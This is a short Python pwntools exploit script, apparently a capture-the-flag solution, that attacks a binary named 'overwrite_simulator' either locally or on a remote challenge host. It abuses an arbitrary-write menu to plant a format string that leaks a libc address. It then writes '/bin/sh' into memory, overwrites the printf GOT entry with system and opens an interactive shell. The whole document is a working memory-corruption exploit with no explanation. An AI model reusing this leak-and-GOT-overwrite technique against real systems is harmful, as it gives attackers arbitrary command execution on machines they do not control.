from pwn import *

elf = ELF('./overwrite_simulator')
context.update(binary=elf)

ctrl = 0x404068

if args.LOCAL:
	p = elf.process()
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	host = 'gc1.eng.run'
	port = 32328
	p = remote(host, port)
	libc = ELF('./libc.so.6')


def write(addr, value):
	if not isinstance(value, bytes):
		value = p64(value)
	align = (8 - len(value) % 8) % 8
	value += b'\n' * align
	for i in range(0, len(value), 8):
		chunk = value[i:i + 8]
		cur_addr = str(addr + i).encode()
		p.sendlineafter(b'>> ', b'1')
		p.sendlineafter(b'overwrite: ', cur_addr)
		p.sendlineafter(b'written: ', chunk)

write(ctrl, b'%13$lx\x01')
p.sendlineafter(b'>> ', b'2')
r = p.recvuntil(b'\x01')[:-1]
r = int(r.strip().decode(), 16) - 243
log.info(f'Leaked __libc_start_main: {hex(r)}')
libc.address = r - libc.symbols['__libc_start_main']

write(ctrl, b'/bin/sh\x00')
write(elf.got['printf'], libc.symbols['system'])

p.interactive()
p.close()